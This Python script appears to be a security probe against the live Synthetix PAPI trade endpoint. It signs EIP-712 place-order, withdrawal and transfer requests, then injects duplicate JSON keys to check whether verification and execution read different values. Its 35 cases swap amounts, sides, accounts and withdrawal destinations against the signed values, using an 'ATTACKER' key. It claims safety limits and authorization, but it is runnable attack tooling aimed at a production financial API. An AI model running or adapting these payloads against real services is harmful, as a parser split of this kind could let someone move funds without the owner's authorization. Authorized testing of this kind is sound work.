#!/usr/bin/env python3
"""Controlled duplicate-JSON-key parser differential for Synthetix PAPI.

Safety constraints:
- deterministic EOA confirmed to own/manage/delegate zero accounts;
- deliberately nonexistent valid-range source/destination account IDs;
- place/withdraw/transfer requests can never pass ownership or mutate state;
- each request uses a fresh nonce and fixed low-value payload;
- no real account, credential, position, order, balance, or transaction is touched.

Goal: determine whether the outer request parser, EIP-712 verifier, action dispatcher, and Go action
payload decoder choose different occurrences of duplicate JSON keys. A first/last-key split could
allow an attacker to preserve the signed value for verification while executing a different account,
amount, destination, side, price, or boolean in the business handler.
"""
from __future__ import annotations

import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any, Callable

from eth_account import Account
from eth_account.messages import encode_typed_data

OUT = pathlib.Path("duplicate_json_keys")
OUT.mkdir(parents=True, exist_ok=True)

TRADE = "https://papi.synthetix.io/v1/trade"
INFO = "https://papi.synthetix.io/v1/info"
UA = "Mozilla/5.0 (compatible; authorized-synthetic-security-review/1.0)"
ATTACKER = Account.from_key("0x" + "e5" * 32)
SOURCE_A = 8_300_000_000_020_001
SOURCE_B = 8_300_000_000_020_002
TO_A = 8_300_000_000_020_101
TO_B = 8_300_000_000_020_102
ZERO = "0x0000000000000000000000000000000000000000"
DEAD = "0x000000000000000000000000000000000000dEaD"
MAX_BODY = 2 * 1024 * 1024
ADDRESS_RE = re.compile(r"0x[a-fA-F0-9]{40}")

DOMAIN = {"name": "Synthetix", "version": "1", "chainId": 1, "verifyingContract": ZERO}
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
ORDER_FIELDS = [
    {"name": "symbol", "type": "string"},
    {"name": "side", "type": "string"},
    {"name": "orderType", "type": "string"},
    {"name": "price", "type": "string"},
    {"name": "triggerPrice", "type": "string"},
    {"name": "quantity", "type": "string"},
    {"name": "reduceOnly", "type": "bool"},
    {"name": "isTriggerMarket", "type": "bool"},
    {"name": "clientOrderId", "type": "string"},
    {"name": "closePosition", "type": "bool"},
]
PLACE_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "orders", "type": "Order[]"},
    {"name": "grouping", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
WITHDRAW_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "symbol", "type": "string"},
    {"name": "amount", "type": "string"},
    {"name": "destination", "type": "address"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
TRANSFER_FIELDS = [
    {"name": "amount", "type": "string"},
    {"name": "expiresAfter", "type": "uint256"},
    {"name": "nonce", "type": "uint256"},
    {"name": "subAccountId", "type": "uint256"},
    {"name": "symbol", "type": "string"},
    {"name": "to", "type": "uint256"},
]

CANONICAL_ORDER = [
    ("symbol", "BTC-USDT"),
    ("side", "buy"),
    ("orderType", "limitGtc"),
    ("price", "1"),
    ("triggerPrice", ""),
    ("quantity", "0.001"),
    ("reduceOnly", False),
    ("isTriggerMarket", False),
    ("clientOrderId", "0x" + "cd" * 16),
    ("closePosition", False),
]


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = ADDRESS_RE.sub("<address>", str(value))
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{12,}\b", "<large-number>", text)
    return text[:1200]


def abbrev(address: str) -> str:
    return address[:5] + "..." + address[-3:]


def post(url: str, body: bytes) -> tuple[int, bytes, dict[str, str], float]:
    req = urllib.request.Request(
        url,
        data=body,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=45) as response:
            raw = response.read(MAX_BODY + 1)
            status = response.status
            headers = dict(response.headers.items())
    except urllib.error.HTTPError as exc:
        raw = exc.read(MAX_BODY + 1)
        status = exc.code
        headers = dict(exc.headers.items()) if exc.headers else {}
    elapsed = time.monotonic() - started
    if len(raw) > MAX_BODY:
        raise RuntimeError("response exceeds safety cap")
    return status, raw, headers, elapsed


def json_post(url: str, payload: dict[str, Any]) -> tuple[int, Any]:
    status, raw, _, _ = post(url, json.dumps(payload, separators=(",", ":")).encode())
    try:
        return status, json.loads(raw)
    except Exception:
        return status, None


def account_count(response: Any) -> int | None:
    if isinstance(response, list):
        return len(response)
    if isinstance(response, dict):
        values: list[Any] = []
        recognized = False
        for key in ("subAccountIds", "managedSubAccountIds", "delegatedSubAccountIds"):
            item = response.get(key)
            if isinstance(item, list):
                recognized = True
                values.extend(item)
        return len(values) if recognized else None
    return None


def encode_value(value: Any) -> str:
    if isinstance(value, Raw):
        return value.text
    return json.dumps(value, separators=(",", ":"))


@dataclass(frozen=True)
class Raw:
    text: str


def object_json(pairs: list[tuple[str, Any]]) -> str:
    return "{" + ",".join(json.dumps(key) + ":" + encode_value(value) for key, value in pairs) + "}"


def array_json(values: list[Any]) -> str:
    return "[" + ",".join(encode_value(value) for value in values) + "]"


def signature(primary: str, types: dict[str, Any], message: dict[str, Any]) -> dict[str, Any]:
    encoded = encode_typed_data(
        full_message={"types": types, "primaryType": primary, "domain": DOMAIN, "message": message}
    )
    signed = ATTACKER.sign_message(encoded)
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def signed_place(nonce: int) -> tuple[dict[str, Any], dict[str, Any]]:
    expiry = nonce + 60_000
    order = dict(CANONICAL_ORDER)
    message = {
        "subAccountId": SOURCE_A,
        "orders": [order],
        "grouping": "na",
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    sig = signature(
        "PlaceOrders",
        {"EIP712Domain": DOMAIN_FIELDS, "Order": ORDER_FIELDS, "PlaceOrders": PLACE_FIELDS},
        message,
    )
    return sig, {"nonce": nonce, "expiresAfter": expiry}


def signed_withdraw(nonce: int) -> tuple[dict[str, Any], dict[str, Any]]:
    expiry = nonce + 60_000
    message = {
        "subAccountId": SOURCE_A,
        "symbol": "USDT",
        "amount": "1",
        "destination": ATTACKER.address,
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    sig = signature(
        "WithdrawCollateral",
        {"EIP712Domain": DOMAIN_FIELDS, "WithdrawCollateral": WITHDRAW_FIELDS},
        message,
    )
    return sig, {"nonce": nonce, "expiresAfter": expiry}


def signed_transfer(nonce: int) -> tuple[dict[str, Any], dict[str, Any]]:
    expiry = nonce + 60_000
    message = {
        "amount": "1",
        "expiresAfter": expiry,
        "nonce": nonce,
        "subAccountId": SOURCE_A,
        "symbol": "USDT",
        "to": TO_A,
    }
    sig = signature(
        "TransferCollateral",
        {"EIP712Domain": DOMAIN_FIELDS, "TransferCollateral": TRANSFER_FIELDS},
        message,
    )
    return sig, {"nonce": nonce, "expiresAfter": expiry}


def envelope(top_pairs: list[tuple[str, Any]], params_pairs: list[tuple[str, Any]]) -> bytes:
    pairs = list(top_pairs) + [("params", Raw(object_json(params_pairs)))]
    return object_json(pairs).encode()


def canonical_place(nonce: int) -> bytes:
    sig, meta = signed_place(nonce)
    order = Raw(object_json(CANONICAL_ORDER))
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])],
        [
            ("action", "placeOrders"),
            ("subaccountId", str(SOURCE_A)),
            ("walletAddress", ATTACKER.address),
            ("orders", Raw(array_json([order]))),
            ("grouping", "na"),
        ],
    )


def canonical_withdraw(nonce: int) -> bytes:
    sig, meta = signed_withdraw(nonce)
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])],
        [
            ("action", "withdrawCollateral"),
            ("subaccountId", str(SOURCE_A)),
            ("walletAddress", ATTACKER.address),
            ("symbol", "USDT"),
            ("amount", "1"),
            ("destination", ATTACKER.address),
        ],
    )


def canonical_transfer(nonce: int) -> bytes:
    sig, meta = signed_transfer(nonce)
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])],
        [
            ("action", "transferCollateral"),
            ("subaccountId", str(SOURCE_A)),
            ("walletAddress", ATTACKER.address),
            ("symbol", "USDT"),
            ("amount", "1"),
            ("to", str(TO_A)),
        ],
    )


def duplicate_place_order(nonce: int, field: str, first: Any, second: Any) -> bytes:
    sig, meta = signed_place(nonce)
    order_pairs: list[tuple[str, Any]] = []
    for key, value in CANONICAL_ORDER:
        if key == field:
            order_pairs.extend([(key, first), (key, second)])
        else:
            order_pairs.append((key, value))
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])],
        [
            ("action", "placeOrders"),
            ("subaccountId", str(SOURCE_A)),
            ("walletAddress", ATTACKER.address),
            ("orders", Raw(array_json([Raw(object_json(order_pairs))]))),
            ("grouping", "na"),
        ],
    )


def duplicate_place_param(nonce: int, field: str, first: Any, second: Any) -> bytes:
    sig, meta = signed_place(nonce)
    base: list[tuple[str, Any]] = [
        ("action", "placeOrders"),
        ("subaccountId", str(SOURCE_A)),
        ("walletAddress", ATTACKER.address),
        ("orders", Raw(array_json([Raw(object_json(CANONICAL_ORDER))]))),
        ("grouping", "na"),
    ]
    pairs: list[tuple[str, Any]] = []
    for key, value in base:
        if key == field:
            pairs.extend([(key, first), (key, second)])
        else:
            pairs.append((key, value))
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])],
        pairs,
    )


def duplicate_place_top(nonce: int, field: str, first: Any, second: Any) -> bytes:
    sig, meta = signed_place(nonce)
    top = [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])]
    pairs: list[tuple[str, Any]] = []
    for key, value in top:
        if key == field:
            pairs.extend([(key, first), (key, second)])
        else:
            pairs.append((key, value))
    return envelope(
        pairs,
        [
            ("action", "placeOrders"),
            ("subaccountId", str(SOURCE_A)),
            ("walletAddress", ATTACKER.address),
            ("orders", Raw(array_json([Raw(object_json(CANONICAL_ORDER))]))),
            ("grouping", "na"),
        ],
    )


def duplicate_withdraw_param(nonce: int, field: str, first: Any, second: Any) -> bytes:
    sig, meta = signed_withdraw(nonce)
    base = [
        ("action", "withdrawCollateral"),
        ("subaccountId", str(SOURCE_A)),
        ("walletAddress", ATTACKER.address),
        ("symbol", "USDT"),
        ("amount", "1"),
        ("destination", ATTACKER.address),
    ]
    pairs = []
    for key, value in base:
        if key == field:
            pairs.extend([(key, first), (key, second)])
        else:
            pairs.append((key, value))
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])], pairs
    )


def duplicate_transfer_param(nonce: int, field: str, first: Any, second: Any) -> bytes:
    sig, meta = signed_transfer(nonce)
    base = [
        ("action", "transferCollateral"),
        ("subaccountId", str(SOURCE_A)),
        ("walletAddress", ATTACKER.address),
        ("symbol", "USDT"),
        ("amount", "1"),
        ("to", str(TO_A)),
    ]
    pairs = []
    for key, value in base:
        if key == field:
            pairs.extend([(key, first), (key, second)])
        else:
            pairs.append((key, value))
    return envelope(
        [("signature", sig), ("nonce", meta["nonce"]), ("expiresAfter", meta["expiresAfter"])], pairs
    )


@dataclass(frozen=True)
class Case:
    name: str
    family: str
    build: Callable[[int], bytes]


CASES = [
    Case("place_canonical", "place", canonical_place),
    Case("place_price_signed_then_large", "place", lambda n: duplicate_place_order(n, "price", "1", "1000000")),
    Case("place_price_large_then_signed", "place", lambda n: duplicate_place_order(n, "price", "1000000", "1")),
    Case("place_quantity_signed_then_large", "place", lambda n: duplicate_place_order(n, "quantity", "0.001", "1000")),
    Case("place_quantity_large_then_signed", "place", lambda n: duplicate_place_order(n, "quantity", "1000", "0.001")),
    Case("place_reduce_false_then_true", "place", lambda n: duplicate_place_order(n, "reduceOnly", False, True)),
    Case("place_reduce_true_then_false", "place", lambda n: duplicate_place_order(n, "reduceOnly", True, False)),
    Case("place_side_buy_then_sell", "place", lambda n: duplicate_place_order(n, "side", "buy", "sell")),
    Case("place_side_sell_then_buy", "place", lambda n: duplicate_place_order(n, "side", "sell", "buy")),
    Case("place_account_signed_then_zero", "place", lambda n: duplicate_place_param(n, "subaccountId", str(SOURCE_A), "0")),
    Case("place_account_zero_then_signed", "place", lambda n: duplicate_place_param(n, "subaccountId", "0", str(SOURCE_A))),
    Case("place_account_signed_then_other", "place", lambda n: duplicate_place_param(n, "subaccountId", str(SOURCE_A), str(SOURCE_B))),
    Case("place_action_signed_then_withdraw", "place", lambda n: duplicate_place_param(n, "action", "placeOrders", "withdrawCollateral")),
    Case("place_action_withdraw_then_signed", "place", lambda n: duplicate_place_param(n, "action", "withdrawCollateral", "placeOrders")),
    Case("place_grouping_signed_then_twap", "place", lambda n: duplicate_place_param(n, "grouping", "na", "twap")),
    Case("place_grouping_twap_then_signed", "place", lambda n: duplicate_place_param(n, "grouping", "twap", "na")),
    Case("place_nonce_signed_then_other", "place", lambda n: duplicate_place_top(n, "nonce", n, n + 1)),
    Case("place_nonce_other_then_signed", "place", lambda n: duplicate_place_top(n, "nonce", n + 1, n)),
    Case("place_expiry_signed_then_other", "place", lambda n: duplicate_place_top(n, "expiresAfter", n + 60_000, n + 120_000)),
    Case("place_expiry_other_then_signed", "place", lambda n: duplicate_place_top(n, "expiresAfter", n + 120_000, n + 60_000)),
    Case("withdraw_canonical", "withdraw", canonical_withdraw),
    Case("withdraw_amount_signed_then_large", "withdraw", lambda n: duplicate_withdraw_param(n, "amount", "1", "1000000")),
    Case("withdraw_amount_large_then_signed", "withdraw", lambda n: duplicate_withdraw_param(n, "amount", "1000000", "1")),
    Case("withdraw_amount_signed_then_zero", "withdraw", lambda n: duplicate_withdraw_param(n, "amount", "1", "0")),
    Case("withdraw_destination_signed_then_dead", "withdraw", lambda n: duplicate_withdraw_param(n, "destination", ATTACKER.address, DEAD)),
    Case("withdraw_destination_dead_then_signed", "withdraw", lambda n: duplicate_withdraw_param(n, "destination", DEAD, ATTACKER.address)),
    Case("withdraw_account_signed_then_zero", "withdraw", lambda n: duplicate_withdraw_param(n, "subaccountId", str(SOURCE_A), "0")),
    Case("withdraw_account_zero_then_signed", "withdraw", lambda n: duplicate_withdraw_param(n, "subaccountId", "0", str(SOURCE_A))),
    Case("transfer_canonical", "transfer", canonical_transfer),
    Case("transfer_amount_signed_then_large", "transfer", lambda n: duplicate_transfer_param(n, "amount", "1", "1000000")),
    Case("transfer_amount_large_then_signed", "transfer", lambda n: duplicate_transfer_param(n, "amount", "1000000", "1")),
    Case("transfer_to_signed_then_other", "transfer", lambda n: duplicate_transfer_param(n, "to", str(TO_A), str(TO_B))),
    Case("transfer_to_other_then_signed", "transfer", lambda n: duplicate_transfer_param(n, "to", str(TO_B), str(TO_A))),
    Case("transfer_account_signed_then_zero", "transfer", lambda n: duplicate_transfer_param(n, "subaccountId", str(SOURCE_A), "0")),
    Case("transfer_account_zero_then_signed", "transfer", lambda n: duplicate_transfer_param(n, "subaccountId", "0", str(SOURCE_A))),
]


def summarize(case: Case, status: int, raw: bytes, headers: dict[str, str], elapsed: float) -> dict[str, Any]:
    try:
        parsed = json.loads(raw)
    except Exception:
        parsed = None
    error = parsed.get("error") if isinstance(parsed, dict) else None
    message = error.get("message") if isinstance(error, dict) else error
    code = error.get("code") if isinstance(error, dict) else None
    text = str(message) if message is not None else ""
    attacker_abbrev = abbrev(ATTACKER.address)
    return {
        "name": case.name,
        "family": case.family,
        "httpStatus": status,
        "elapsedMs": round(elapsed * 1000, 2),
        "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
        "errorCode": code,
        "messageRedacted": redact(message),
        "messageSha256": digest(text) if text else None,
        "mentionsAttackerAbbreviation": attacker_abbrev.lower() in text.lower(),
        "bodySha256": digest(raw),
        "bodyBytes": len(raw),
        "requestId": (parsed.get("request_id") if isinstance(parsed, dict) else None)
        or headers.get("X-Request-Id")
        or headers.get("x-request-id"),
    }


def main() -> None:
    status, parsed = json_post(
        INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": ATTACKER.address, "includeDelegations": True}},
    )
    response = parsed.get("response") if isinstance(parsed, dict) else None
    count = account_count(response)
    if status != 200 or count != 0:
        raise RuntimeError(f"Synthetic signer preflight failed: status={status}, accountCount={count}")

    base_nonce = int(time.time() * 1000)
    results = []
    for index, case in enumerate(CASES):
        nonce = base_nonce + index * 10 + 1
        body = case.build(nonce)
        results.append(summarize(case, *post(TRADE, body)))
        if index + 1 < len(CASES):
            time.sleep(0.35)

    baselines = {
        "place": next(item for item in results if item["name"] == "place_canonical"),
        "withdraw": next(item for item in results if item["name"] == "withdraw_canonical"),
        "transfer": next(item for item in results if item["name"] == "transfer_canonical"),
    }
    same_as_baseline = []
    attacker_recovered = []
    stage_changes = []
    for item in results:
        baseline = baselines[item["family"]]
        if item["name"] == baseline["name"]:
            continue
        if item["mentionsAttackerAbbreviation"]:
            attacker_recovered.append(item["name"])
        if (
            item["httpStatus"] == baseline["httpStatus"]
            and item["errorCode"] == baseline["errorCode"]
            and item["messageSha256"] == baseline["messageSha256"]
        ):
            same_as_baseline.append(item["name"])
        else:
            stage_changes.append(item["name"])

    output = {
        "safety": "Synthetic zero-account signer; nonexistent accounts; fresh nonces; no request can mutate state.",
        "syntheticAddress": ATTACKER.address,
        "syntheticAddressAbbreviation": abbrev(ATTACKER.address),
        "syntheticAccountCount": count,
        "caseCount": len(results),
        "baselines": baselines,
        "duplicatesMatchingBaselineExactly": same_as_baseline,
        "duplicatesRecoveringSyntheticSigner": attacker_recovered,
        "duplicatesChangingValidationStage": stage_changes,
        "results": results,
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(
        json.dumps(
            {
                "caseCount": len(results),
                "duplicatesMatchingBaselineExactly": same_as_baseline,
                "duplicatesRecoveringSyntheticSigner": attacker_recovered,
                "duplicatesChangingValidationStage": stage_changes,
                "statuses": {item["name"]: item["httpStatus"] for item in results},
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
